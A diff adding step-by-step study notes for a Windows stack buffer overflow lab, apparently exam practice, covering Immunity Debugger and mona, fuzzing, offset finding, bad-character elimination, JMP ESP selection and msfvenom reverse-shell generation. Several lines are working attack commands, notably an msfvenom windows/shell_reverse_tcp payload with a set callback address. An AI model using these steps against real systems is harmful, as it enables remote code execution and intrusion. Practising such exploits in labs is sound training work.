@@ -1,0 +1,127 @@
+BUFFER OVERFLOW:
+	1. 
+	 On the windows host, perform the following:
+		a. 
+		 Open Immunity Debugger as an administrator
+		b. 
+		 Set the path for mona
+			i. 
+			 !mona config -set workingfolder c:\mona\%p
+	1. 
+	 Create our 'fuzzer.py' and 'exploit.py' scripts
+	2. 
+	 In Fuzzer.py
+		a. 
+		 Set the target address
+	1. 
+	 Run the application on the target
+		a. 
+		 Make note of the port it's running off of.
+	1. 
+	 With netcat, connect to the target on the provided port.
+		a. 
+		 Nc [IP] 1337
+		b. 
+		 Type OVERFLOW[#of lab] test
+		c. 
+		 Close the connection
+	1. 
+	 Run the fuzzer.py file
+	2. 
+	 Make note of where it crashes
+	3. 
+	 With the exploit.py:
+		a. 
+		 Use "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l" [patern legnth] to create a pattern 400 bytes longer than the amount that crashed the server.
+	1. 
+	 Take the output and place it in the 'payload' variable of the 'exploit.py' script.
+	2. 
+	 Run exploit.py
+	3. 
+	 After the crash, run the following mona command to change the distance to the same legnth to the pattern we made. 
+		a. 
+		 !mona findmsp -distance 1100
+		b. 
+		 634
+	1. 
+	 Make note of the following line "EIP contains normal pattern : ... (offset XXXX)"
+		a. 
+		 IF THIS STEP FAILS:
+		b. 
+		 Use pattern_offset instead
+		c. 
+		 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb [EIP from crash] [#of bytes from pattern_create]
+	1. 
+	 Clear the payload variable
+	2. 
+	 Update the exploit.py script and set the offset variable.
+	3. 
+	 Set the retn variable to "BBBB"
+	4. 
+	 Run exploit.py again.
+	5. 
+	 Confirm EIP has "42424242" ("BBBB")
+	6. 
+	 Find the bad characters
+	7. 
+	 Generate a byte array and exclude the null byte
+		a. 
+		 !mona bytearray -b "\x00"
+	1. 
+	 Next, generate a string of bad characters that are identical to the bytearray with our badchar script.
+	2. 
+	 Update the exploit.py file and set the payload variable to the string of bad characters ENCLOSED IN PARENTHESIS!!).
+	3. 
+	 Run the '!mona bytearray' command to remove the bad chars we found, THEN MANUALLY UPDATE THE EXPLOIT SCRIPT REMOVING THE SAME BAD CHAR!
+	4. 
+	 Restart Immunity Debugger and run exploit.py
+	5. 
+	 Make note of the ESP register and use it with the following command:
+		a. 
+		 !mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+	1. 
+	 Make note of the bad characters found. ALSO CHECK THE ESP REGISTER MEMORY DUMP TO CONFIRM NO BADCHARS!! THE BYTE ARRAY COMMAND WILL CONFUSE US WITH MULTIPLE BADCHARS!!! 
+	2. 
+	 We can ALSO remove the NULL BYTE and get a list of every character that could be bad.
+	3. 
+	 Generate a new byte array in mona
+	4. 
+	 Run the script again and confirm no alerts of bad characters.
+		a. 
+		 For each bad char found, add them one by one, edit the badchar script, and run the exploit.
+		b. 
+		 Keep doing this until we get an "Unmodified" message in the !mona compare output.
+	1. 
+	 Next we find a jump point (JMP ESP return address)
+	2. 
+	 List the badchars we found.
+		a. 
+		 !mona jmp -r esp -cpb "\x00\x01\x07\x08\x2e\x2f\xa0\xa1"
+		b. 
+		 Make sure to add all of the bad characters found.
+		c. 
+		 REMOVE / RE-ADD THESE ONE BY ONE TO SEE THE RESPONSE.
+		d. 
+		 Do this until the pop-up window shows "Unmodified"
+	1. 
+	 Check the "Log Data" window.
+		a. 
+		 Choose an address and update our exploit.py script, setting the "retn" variable to the address written backwards(little endian).
+		b. 
+		 \xaf\x11\x50\x62\
+	1. 
+	 Use msfvenom to create a payload and include the bad characters with the -b flag. 
+		a. 
+		 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.35.129 LPORT=4444 EXITFUNC=thread -b "\x00\x01\x07\x2e\xa0\xa1" -f c
+		b. 
+		 OR
+		c. 
+		 Msfvenom -p /windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -f py -b "\x00" -e /x86/shikata_ga_nai -v shellcode
+		d. 
+		 EITHER WAY, THE END RESULT IS A WINDOWS PROMPT!! MAKE SURE TO HAVE A NC LISTENER READY!!
+	1. 
+	 Take the generated results and paste it in the payload variable ENCLOSED IN PARENTHESIS!
+	2. 
+	 Add padding to our payload to 16 NOPs
+		a. 
+		 padding = "\x90" * 16
